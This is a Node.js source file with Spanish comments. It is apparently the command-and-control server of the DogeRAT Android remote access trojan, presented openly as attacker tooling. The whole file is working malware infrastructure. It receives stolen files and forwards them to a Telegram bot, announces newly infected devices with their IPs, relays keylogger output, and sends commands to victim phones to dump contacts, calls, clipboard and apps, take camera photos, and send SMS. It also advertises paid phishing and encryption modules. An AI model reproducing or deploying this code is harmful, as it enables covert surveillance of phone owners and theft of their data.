const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Carga de credenciales del atacante
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(data.token, { 'polling': true });

// Estado de la sesión del atacante
const appData = new Map();

// --- RUTAS DE SERVIDOR (C2) ---

// Punto de recepción de archivos (fotos, audios, documentos robados)
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceModel = req.body.model;
    bot.sendDocument(data.id, req.file.buffer, {
        'caption': `<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceModel}</b>`,
        'parse_mode': 'HTML'
    }, { 'filename': fileName });
    res.send("Done");
});

// --- GESTIÓN DE SOCKETS (COMUNICACIÓN CON EL MALWARE) ---

io.on('connection', (socket) => {
    let deviceId = socket.handshake.headers['model'] + '-' + socket.id;
    let model = socket.handshake.query['model'] || "Unknown Device";
    let version = socket.handshake.query['version'] || "N/A";
    let ip = socket.handshake.address || "N/A";

    socket.model = deviceId;

    // Notificación de nueva infección
    bot.sendMessage(data.id, 
        `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n` +
        `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${model}\n` +
        `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${version}\n` +
        `<b>𝚒𝚙</b> → ${ip}\n`, { 'parse_mode': 'HTML' });

    // Canal de retorno de datos (Keylogger, SMS, etc.)
    socket.on('message', (msg) => {
        bot.sendMessage(data.id, `<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚏𝚛𝚘𝚖 ${model}</b>\n\n${msg}`, { 'parse_mode': 'HTML' });
    });

    socket.on('disconnect', () => {
        bot.sendMessage(data.id, `<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n${model}`, { 'parse_mode': 'HTML' });
    });
});

// --- PANEL DE CONTROL TELEGRAM (DOGERAT INTERFACE) ---

bot.on('text', (msg) => {
    const text = msg.text;
    if (text === '/start') {
        bot.sendMessage(data.id, "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>", {
            'parse_mode': 'HTML',
            'reply_markup': {
                'keyboard': [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                'resize_keyboard': true
            }
        });
        return;
    }

    // Lógica para enviar a TODOS o a UNO
    if (text === '✯ 𝙰𝚕𝚕 ✯') {
        appData.set('currentTarget', 'all');
        showActionMenu("𝙰𝚕𝚕 𝙳𝚎𝚟𝚒𝚌𝚎𝚜");
        return;
    }

    // Listado de dispositivos
    if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        let buttons = [];
        io.sockets.sockets.forEach((s) => buttons.push([s.model]));
        bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎</b>", {
            'parse_mode': 'HTML',
            'reply_markup': { 'keyboard': buttons, 'resize_keyboard': true }
        });
        return;
    }

    // Identificar si el texto es el ID de un dispositivo conectado
    io.sockets.sockets.forEach((s) => {
        if (text === s.model) {
            appData.set('currentTarget', s.id);
            showActionMenu(s.model);
        }
    });

    // --- PROCESAMIENTO DE COMANDOS ---
    const target = appData.get('currentTarget');
    if (!target) return;

    // COMANDOS SIMPLES (Sin parámetros)
    const simpleCommands = {
        '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': 'get-contacts',
        '✯ 𝙲𝚊𝚕𝚕𝚜 ✯': 'get-calls',
        '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯': 'main-camera',
        '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯': 'selfie-camera',
        '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯': 'keylogger-on',
        '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯': 'keylogger-off',
        '✯ 𝙸𝚗𝚏𝚘 ✯': 'device-info',
        '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': 'get-clipboard',
        '✯ 𝙰𝚙𝚙𝚜 ✯': 'get-apps',
        '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯': 'stop-audio'
    };

    if (simpleCommands[text]) {
        sendCommand(target, simpleCommands[text]);
        bot.sendMessage(data.id, "<b>✯ 𝚁𝚎𝚚𝚞𝚎𝚜𝚝 𝚜𝚎𝚗𝚝</b>", { 'parse_mode': 'HTML' });
    }

    // COMANDOS CON ESTADOS (Requieren más datos del atacante)
    if (text === '✯ 𝚂𝙼𝚂 ✯') {
        appData.set('currentAction', 'smsNum');
        bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛</b>", { 'parse_mode': 'HTML' });
    } else if (appData.get('currentAction') === 'smsNum') {
        appData.set('tempNum', text);
        appData.set('currentAction', 'smsMsg');
        bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚖𝚎𝚜𝚜𝚊𝚐𝚎</b>", { 'parse_mode': 'HTML' });
    } else if (appData.get('currentAction') === 'smsMsg') {
        sendCommand(target, 'send-sms', [{key: 'number', value: appData.get('tempNum')}, {key: 'text', value: text}]);
        appData.delete('currentAction');
    }

    // GESTIÓN DE BLOQUEOS PREMIUM (Literal del código original)
    const premium = ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'];
    if (premium.includes(text)) {
        bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>", { 'parse_mode': 'HTML' });
    }
});

// Funciones auxiliares para mantener el código limpio
function showActionMenu(label) {
    bot.sendMessage(data.id, `<b>✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 ${label}</b>`, {
        'parse_mode': 'HTML',
        'reply_markup': {
            'keyboard': [
                ['✯ 𝚂𝙼𝚂 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'], ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
                ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'], ['✯ 𝙸𝚗𝚏𝚘 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
                ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯']
            ], 'resize_keyboard': true
        }
    });
}

function sendCommand(target, request, extras = []) {
    const payload = { 'request': request, 'extras': extras };
    if (target === 'all') io.emit('action', payload);
    else io.to(target).emit('action', payload);
}

server.listen(3000);
